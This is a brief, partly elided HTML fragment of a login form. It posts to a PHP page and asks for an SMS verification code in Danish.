  ...
  <div class="form--wrapper">
    <form action="logged-in.php" method="post">
      ...
      <div class="form--password-wrapper">
        ...
        <input type="password" placeholder="Indtast kode fra SMS" id="password" autofocus name="password" class="form--input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" required>
      </div>
